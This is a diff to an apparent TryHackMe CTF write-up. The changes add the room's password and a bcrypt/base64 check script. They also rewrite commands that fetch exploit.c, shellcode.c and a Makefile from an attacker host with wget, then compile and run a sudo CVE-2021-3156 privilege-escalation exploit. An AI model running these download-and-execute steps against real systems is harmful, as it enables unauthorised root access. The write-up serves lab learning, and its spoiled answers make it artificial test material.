@@ -67,6 +67,8 @@ mysql -u runcheck -p -h 10.10.80.142
 CTF_script_cave_changeme
 ```
 
+if it appear an error, wait a minute until it connect
+
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4e2144f9-f03d-4142-aa4a-1976a7c43bab)
 
 ```
@@ -155,9 +157,29 @@ with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
 			exit()
 ```
 
-i said it will take you too long to get actual password... maybe more than 30 min for me :(
+i said it will take you too long to get actual password...
 
-so, i found another approach at CVE-2021-3156
+Spoiler alert: the password is `isolsa_tabefX100pre`. Where does this occur in rockyou?
+
+```
+import bcrypt
+import base64
+
+password = 'isolsa_tabefX100pre'
+bpass = password.encode('ascii')
+passed= str(base64.b64encode(bpass))
+hash = bcrypt.hashpw(passed.encode(), b'$2b$12$SVInH5XmuS3C7eQkmqa6UO')
+stored_hash = b'$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6'
+
+if hash == stored_hash:
+  print("match: ", password)
+```
+
+Ok. Let's say we use our python script and run through rockyou; how long would that take? 
+
+Honestly I don't know, but it would be a long time. Many hours. i don't know how it got past testing
+
+but, i found another approach at CVE-2021-3156
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f00a1b03-9013-49ca-b99e-86e08dfb0bea)
 
@@ -171,12 +193,16 @@ on target machine
 
 ```
 cd /tmp
-curl http://10.18.37.45:8000/exploit.c -o exploit.c
-curl http://10.18.37.45:8000/shellcode.c -o shellcode.c
-curl http://10.18.37.45:8000/Makefile -o Makefile
+wget http://10.18.37.45:8000/exploit.c
+wget http://10.18.37.45:8000/shellcode.c
+wget http://10.18.37.45:8000/Makefile
 make
 ./exploit 0
 ```
+
+maybe it's not work, a bad experience
+
+
 
 
 
